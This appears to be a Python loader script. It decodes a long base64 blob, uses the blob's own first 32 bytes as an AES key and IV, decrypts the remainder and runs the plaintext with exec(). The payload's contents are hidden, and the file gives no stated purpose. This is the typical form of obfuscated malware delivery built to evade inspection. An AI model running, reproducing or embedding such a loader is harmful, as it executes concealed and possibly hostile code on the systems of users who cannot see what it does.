from Crypto.Cipher import AES
import base64

def unpad(data):
    return data[:-data[-1]]

encoded_data = b"""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"""

raw = base64.b64decode(encoded_data)
key = raw[:16]
iv = raw[16:32]
ciphertext = raw[32:]

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(ciphertext))
exec(decrypted.decode("utf-8"))

